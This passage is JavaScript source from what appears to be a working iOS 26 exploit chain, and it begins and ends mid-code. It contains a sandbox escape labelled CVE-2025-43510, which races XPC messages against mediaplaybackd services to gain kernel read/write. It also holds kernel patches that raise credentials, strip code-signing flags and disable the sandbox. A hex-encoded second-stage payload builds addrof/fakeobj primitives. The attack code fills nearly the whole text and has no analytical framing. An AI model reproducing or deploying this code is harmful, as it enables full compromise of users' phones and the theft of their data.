    let label = kernelRead64(ucred + CRED_LABEL_OFFSET);
    if (label >= 0xFFFFFFF000000000n && label < 0xFFFFFFFF00000000n) {
      let sandbox_slot = label + SANDBOX_SLOT_OFFSET;
      let current_sandbox = kernelRead64(sandbox_slot);
      if (current_sandbox !== 0n) {
        kernelWrite64(sandbox_slot, 0n);
        LOG('Sandbox disabled');
      } else {
        LOG('Sandbox already disabled');
      }
      return true;
    }
    LOG('WARNING: cr_label is NULL');
    return false;
  }



  function escalate_privileges() {
    LOG('Starting iOS 26 privilege escalation...');
    const getpid_addr = func_resolve('getpid');
    if (getpid_addr && getpid_addr !== 0n) {
      current_pid = Number(gpu_fcall(getpid_addr));
      globalThis.currentPid = current_pid;
      LOG(`Current PID: ${current_pid}`);
    } else {
      current_pid = 1;
      LOG('WARNING: Could not get PID, using fallback');
    }
    current_proc = find_proc_by_pid(current_pid);
    if (current_proc === 0n) {
      LOG('ERROR: Could not find current proc');
      return false;
    }
    globalThis.current_proc = current_proc;
    let cred_ok = patch_proc_credentials(current_proc);
    if (!cred_ok) {
      LOG('WARNING: Credential patching may have failed');
    }
    let task_ok = patch_task_flags(current_proc);
    if (!task_ok) {
      LOG('WARNING: Task flags patching may have failed');
    }
    let proc_ok = patch_proc_flags(current_proc);
    if (!proc_ok) {
      LOG('WARNING: Proc flags patching may have failed');
    }
    let csflags_ok = patch_proc_csflags(current_proc);
    if (!csflags_ok) {
      LOG('WARNING: csflags patching may have failed');
    }
    let sandbox_ok = patch_sandbox(current_proc);
    if (!sandbox_ok) {
      LOG('WARNING: sandbox disabling may have failed');
    }
    LOG('iOS 26 privilege escalation complete');
    return true;
  }

  function sbx1sbx1() {
    let kr = KERN_SUCCESS;
    LOG("Sbx1 iOS 26 starting... (CVE-2025-43510-26)");
    let device_machine = wc_get_device_machine();
    if (wc_strstr(device_machine, wc_get_cstring("iPhone17,")) != 0n) {
      is_a17_devices = true;
      LOG("Running on A17/A18 Devices (iOS 26)");
    } else if (wc_strstr(device_machine, wc_get_cstring("iPhone16,")) != 0n) {
      is_a17_devices = false;
      is_m3_devices = false;
      LOG("Running on A16 Devices (iOS 26)");
    } else {
      LOG("Running on unknown iOS 26 device");
    }
    let surface = create_iosurface(surface_size);
    let spray_memory_object = setup_guess_address(surface);
    let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
    LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
    LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
    LOG(`source_surface_address: ${sbx1sbx1_ctx.source_surface_address.hex()}`);
    LOG(`source_surface_size: ${sbx1sbx1_ctx.source_surface_size.hex()}`);
    LOG(`destination_surface: ${sbx1sbx1_ctx.destination_surface.hex()}`);
    LOG(`destination_surface_address: ${sbx1sbx1_ctx.destination_surface_address.hex()}`);
    LOG(`destination_surface_size: ${sbx1sbx1_ctx.destination_surface_size.hex()}`);
    let test = calloc(1n, 8n);
    uwrite64(test, 0xbabababababababan);
    sbx1sbx1_exp_write_prepare(sbx1sbx1_ctx, test, 8n);
    sbx1sbx1_exp_write_perform(sbx1sbx1_ctx);
    let key_hdr_sz = 0x28n;
    let big_key_size = PAGE_SIZE * 8n - key_hdr_sz;
    let small_key_size = PAGE_SIZE * 4n - key_hdr_sz;
    let random_key_size = PAGE_SIZE * 1n - key_hdr_sz;
    let big_key = calloc(1n, big_key_size);
    let small_key = calloc(1n, small_key_size);
    let random_key = calloc(1n, random_key_size);
    memset(big_key, 0x41n, big_key_size - 1n);
    memset(small_key, 0x42n, small_key_size - 1n);
    memset(random_key, 0x43n, random_key_size - 1n);
    let o = oxpc_dictionary_alloc();
    let null_o = oxpc_null_alloc();
    oxpc_dictionary_append(o, big_key, null_o);
    uwrite8(big_key, uread8(big_key) + 0x1);
    for (let i = 0n; i < 4n; i++) {
      oxpc_dictionary_append(o, small_key, null_o);
      uwrite8(small_key, uread8(small_key) + 0x1);
    }
    oxpc_dictionary_append(o, big_key, null_o);
    oxpc_dictionary_append(o, random_key, null_o);
    free(big_key);
    free(small_key);
    free(random_key);
    let port_ptr = new_uint64_t();
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_ptr);
    let port = uread32(port_ptr);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    let payload = oxpc_object_serialize_with_header(o);
    let port_list = payload["ports"];
    let serialized_payload_size = payload["total_size"];
    let serialized_payload = payload["buffer"];
    oxpc_port_list_append(port_list, port);
    let magic_ptr = new_uint64_t(0x41414142n);
    let start_of_target_string = memmem(serialized_payload, serialized_payload_size, magic_ptr, 0x4n);
    assert(start_of_target_string != NULL, "Failed to find target string");
    uwrite8(start_of_target_string, 0x41);
    let end_of_target_string = start_of_target_string + big_key_size;
    let end_of_target_string_page = trunc_page(end_of_target_string);
    let ool_string_offset = start_of_target_string - serialized_payload;
    let target_offset = end_of_target_string - end_of_target_string_page - 1n;
    LOG("end_of_target_string_page: " + end_of_target_string_page.hex());
    LOG("target_offset: " + target_offset.hex());
    let original_ool_page = calloc(1n, PAGE_SIZE);
    memcpy(original_ool_page, end_of_target_string_page, PAGE_SIZE);
    let tmp_ptr = new_uint64_t(end_of_target_string_page);
    let cur_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    let max_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    kr = mach_vm_remap(mach_task_self(), tmp_ptr, PAGE_SIZE, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, mach_task_self(), sbx1sbx1_ctx.destination_surface_address + MAX_TRANSFER_BYTES, 1n, cur_protection_ptr, max_protection_ptr, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    sbx1sbx1_exp_write_prepare_and_perform(sbx1sbx1_ctx, original_ool_page, PAGE_SIZE);
    let buffer_size = 16n + 1n;
    let original_buffer = calloc(1n, buffer_size);
    memcpy(original_buffer, original_ool_page + target_offset, buffer_size);
    let modified_buffer = calloc(1n, buffer_size);
    uwrite8(modified_buffer, 0x41);
    uwrite64(modified_buffer + 1n, 0xbabababababababan);
    let n_of_current_exp_write_threads = 1n;
    let n_of_exp_write_threads = get_ncpu();
    let exp_write_threads = [];
    LOG(`Using ${n_of_exp_write_threads} EXP target threads for iOS 26 PPLv2 bypass.`);
    for (let i = 0n; i < n_of_exp_write_threads; i++) {
      exp_write_threads[i] = sbx1sbx1_exp_write_thread_setup(sbx1sbx1_ctx, buffer_size, original_buffer, modified_buffer, target_offset);
    }
    let success = false;
    let services = [
      "com.apple.coremedia.mediaplaybackd.asset.xpc",
      "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc",
      "com.apple.coremedia.mediaplaybackd.cpe.xpc",
      "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc",
      "com.apple.coremedia.mediaplaybackd.figcontentkeyboss.xpc",
      "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc",
      "com.apple.coremedia.mediaplaybackd.figcpecryptor.xpc",
      "com.apple.coremedia.mediaplaybackd.figmetriceventtimeline.xpc",
      "com.apple.coremedia.mediaplaybackd.formatreader.xpc",
      "com.apple.coremedia.mediaplaybackd.visualcontext.xpc"
    ];
    let services_idx = 0n;
    set_realtime_priority(gpu_fcall(PTHREAD_SELF), 0, 50, 50);
    pthread_yield_np(pthread_self());
    for (let attempt = 0n; attempt < 8n; attempt++) {
      if (services_idx >= services.length) {
        break;
      }
      let TARGET_XPC_SERVICE = services[services_idx];
      let connection = xpcjs_xpc_connect(TARGET_XPC_SERVICE);
      if (connection == null) {
        LOG(`connection failed, retrying again with a different endpoint...`);
        continue;
      }
      LOG(`connected to ${TARGET_XPC_SERVICE}`);
      LOG(`connection client_port: ${connection["client_port"].hex()}`);
      LOG(`connection reply_port: ${connection["reply_port"].hex()}`);
      let test_msg = test_msg_create(connection);
      let message = oxpc_build_mach_message(serialized_payload, serialized_payload_size, 1n, port_list, connection["client_port"], connection["reply_port"]);
      let xpc_msg_size = message["message_size"];
      let xpc_msg = message["message"];
      let mach_msg_option = MACH_SEND_MSG | MACH_SEND_TIMEOUT;
      let mach_msg_send_size = xpc_msg_size;
      let mach_msg_rcv_size = xpc_msg_size + PAGE_SIZE;
      let mach_msg_rcv_name = connection["reply_port"];
      spray_guess_address(spray_memory_object, surface);
      uwrite64(modified_buffer + 1n + 8n, guess_address + 0x110n);
      let n_of_max_exp_attempts = 8192n;
      let yield_threshold = 256n;
      for (let exp_attempt = 0n; exp_attempt < n_of_max_exp_attempts; exp_attempt++) {
        thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
        kr = mach_msg(xpc_msg, mach_msg_option, mach_msg_send_size, 0n, 0n, 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          if (kr != KERN_SUCCESS) {
            LOG(`[!] Unexpected return code from mach_msg: ${kr.hex()} for exp_attempt: ${exp_attempt}, retrying...`);
            services_idx++;
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            break;
          }
          if (exp_attempt != 0n && exp_attempt % yield_threshold == 0n) {
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            LOG("Yielding...");
            pthread_yield_np(pthread_self());
            thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
          }
          if (exp_attempt > n_of_max_exp_attempts - 32n) {
            LOG(`too many attempts, exp_attempt: ${exp_attempt}...`);
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            return false;
          }
          thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
          n_of_current_exp_write_threads = (n_of_current_exp_write_threads + 1n) % n_of_exp_write_threads;
          if (n_of_current_exp_write_threads == 0n) {
            n_of_current_exp_write_threads = 1n;
          }
          continue;
        }
        thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
        LOG(`Likely successful PPLv2 bypass attempt (#${exp_attempt}), checking...`);
        kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          LOG("[x] Error: Daemon likely crashed, retrying...");
          break;
        }
        success = true;
        break;
      }
      let alive = false;
      if (success) {
        while (true) {
          surface_address_remote = uread64(surface_address + 0x8n);
          if (surface_address_remote != 0n) {
            break;
          }
        }
        LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
        setup_nativefcall_fcall();
        {
          LOG("[i] nativefcall setup done for iOS 26...");
          lazy_fcall("usleep", 5n * 1000n);
          mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
          while (true) {
            let interval = Date.now();
            let test_msg = test_msg_create(connection);
            kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
            interval = Date.now() - interval;
            LOG(`msg took: ${interval} ms`);
            if (kr == MACH_SEND_TIMED_OUT) {
              if (mpd_fcall_check_for_return() == false) {
                continue;
              }
              LOG(`[i] calloc() survived PPLv2 !!!`);
              alive = true;
              break;
            } else {
              LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
              services_idx = 0n;
              alive = false;
              break;
            }
          }
        }
        mach_port_deallocate(mach_task_self(), connection["client_port"]);
        if (alive) {
          break;
        }
      }
    }
    if (success == false) {
      LOG("[x] Error: Reached maximum number of attempts, aborting...");
      return false;
    }
    LOG("iOS 26 kernel R/W primitive established");
    return true;
  }

  function spawn_pe() {
    LOG("Spawning PE for iOS 26....");
    let pe_stage1_js_data = 0n;
    let pe_main_js_data = 0n;
    let pe_post_js_data = 0n;
    if (integrated) {
      let pe_stage1_js_data_array = new Uint8Array([
        0x28, 0x28, 0x29, 0x20, 0x3d, 0x3e, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74,
        0x20, 0x61, 0x62, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x41, 0x72, 0x72, 0x61, 0x79, 0x42,
        0x75, 0x66, 0x66, 0x65, 0x72, 0x28, 0x38, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73,
        0x74, 0x20, 0x75, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55,
        0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x75, 0x33, 0x32, 0x20, 0x3d, 0x20, 0x6e, 0x65,
        0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x33, 0x32, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x75, 0x38, 0x20, 0x3d, 0x20,
        0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61,
        0x62, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x66, 0x36, 0x34, 0x20,
        0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x46, 0x6c, 0x6f, 0x61, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72,
        0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74,
        0x2e, 0x66, 0x72, 0x6f, 0x6d, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75,
        0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x76, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x66, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x76, 0x3b, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0x0a,
        0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x66, 0x72,
        0x6f, 0x6d, 0x42, 0x79, 0x74, 0x65, 0x73, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69,
        0x6f, 0x6e, 0x20, 0x28, 0x62, 0x79, 0x74, 0x65, 0x73, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x20, 0x3d, 0x20, 0x30, 0x3b,
        0x20, 0x69, 0x20, 0x3c, 0x20, 0x38, 0x3b, 0x20, 0x2b, 0x2b, 0x69, 0x29, 0x20, 0x7b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x38, 0x5b, 0x69, 0x5d, 0x20, 0x3d, 0x20, 0x62, 0x79, 0x74,
        0x65, 0x73, 0x5b, 0x69, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0x0a,
        0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72,
        0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x68, 0x65, 0x78, 0x20, 0x3d, 0x20, 0x66, 0x75,
        0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65,
        0x72, 0x20, 0x3d, 0x20, 0x31, 0x36, 0x2c, 0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x20,
        0x3d, 0x20, 0x30, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x73,
        0x20, 0x3d, 0x20, 0x27, 0x30, 0x78, 0x27, 0x20, 0x2b, 0x20, 0x74, 0x68, 0x69, 0x73, 0x2e, 0x74,
        0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x31, 0x36, 0x29, 0x2e, 0x70, 0x61, 0x64, 0x53,
        0x74, 0x61, 0x72, 0x74, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x2c, 0x20,
        0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d,
        0x5b, 0x73, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20,
        0x73, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74,
        0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x68, 0x65, 0x78, 0x50, 0x6c,
        0x61, 0x69, 0x6e, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28,
        0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x31, 0x36, 0x2c, 0x20,
        0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x20, 0x3d, 0x20, 0x30, 0x29, 0x20, 0x7b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x73, 0x20, 0x3d, 0x20, 0x74, 0x68, 0x69, 0x73, 0x2e,
        0x74, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x31, 0x36, 0x29, 0x2e, 0x70, 0x61, 0x64,
        0x53, 0x74, 0x61, 0x72, 0x74, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x2c,
        0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x5b,
        0x5d, 0x5b, 0x73, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e,
        0x20, 0x73, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e,
        0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x61, 0x73, 0x44, 0x6f,
        0x75, 0x62, 0x6c, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20,
        0x28, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20,
        0x3d, 0x20, 0x74, 0x68, 0x69, 0x73, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75,
        0x72, 0x6e, 0x20, 0x66, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a,
        0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79,
        0x70, 0x65, 0x2e, 0x6e, 0x6f, 0x50, 0x41, 0x43, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74,
        0x69, 0x6f, 0x6e, 0x20, 0x28, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x26, 0x20,
        0x30, 0x78, 0x37, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x6e, 0x3b, 0x0a, 0x20,
        0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f,
        0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x61, 0x73, 0x49, 0x6e, 0x74, 0x33, 0x32, 0x73, 0x20,
        0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x74, 0x68, 0x69,
        0x73, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6c, 0x6f, 0x20,
        0x3d, 0x20, 0x75, 0x33, 0x32, 0x5b, 0x30, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f,
        0x6e, 0x73, 0x74, 0x20, 0x68, 0x69, 0x20, 0x3d, 0x20, 0x75, 0x33, 0x32, 0x5b, 0x31, 0x5d, 0x3b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x68, 0x69, 0x20,
        0x3d, 0x20, 0x68, 0x69, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x68, 0x69,
        0x20, 0x3e, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x29, 0x20,
        0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x68, 0x69, 0x20, 0x3d,
        0x20, 0x68, 0x69, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x20, 0x26, 0x20, 0x30, 0x78, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x6e, 0x65,
        0x77, 0x5f, 0x6c, 0x6f, 0x20, 0x3d, 0x20, 0x6c, 0x6f, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69,
        0x66, 0x20, 0x28, 0x6c, 0x6f, 0x20, 0x3e, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x30, 0x30, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6e, 0x65, 0x77,
        0x5f, 0x6c, 0x6f, 0x20, 0x3d, 0x20, 0x6c, 0x6f, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x30, 0x30,
        0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x20, 0x26, 0x20, 0x30, 0x78, 0x66, 0x66, 0x66, 0x66, 0x66,
        0x66, 0x66, 0x66, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72,
        0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x5b, 0x6e, 0x65, 0x77, 0x5f, 0x6c, 0x6f, 0x2c, 0x20, 0x6e,
        0x65, 0x77, 0x5f, 0x68, 0x69, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x63,
        0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6e, 0x6f, 0x43, 0x6f, 0x77, 0x20, 0x3d, 0x20, 0x31, 0x2e, 0x31,
        0x3b, 0x0a, 0x20, 0x20, 0x75, 0x6e, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x20,
        0x3d, 0x20, 0x5b, 0x6e, 0x6f, 0x43, 0x6f, 0x77, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x62, 0x6f, 0x78,
        0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x20, 0x3d, 0x20, 0x5b, 0x7b, 0x7d, 0x5d, 0x3b, 0x0a, 0x20,
        0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x61, 0x72,
        0x72, 0x61, 0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41,
        0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x34, 0x30, 0x30, 0x30, 0x29, 0x2e, 0x66, 0x69, 0x6c,
        0x6c, 0x28, 0x30, 0x78, 0x66, 0x65, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72,
        0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42,
        0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78,
        0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61,
        0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36,
        0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f,
        0x38, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36,
        0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x20, 0x3d, 0x20, 0x6e,
        0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78,
        0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6d,
        0x65, 0x6d, 0x20, 0x3d, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f,
        0x66, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x2c, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66,
        0x69, 0x6e, 0x65, 0x64, 0x2c, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34,
        0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x2c, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69,
        0x6e, 0x65, 0x64, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f,
        0x66, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x6f, 0x29,
        0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72,
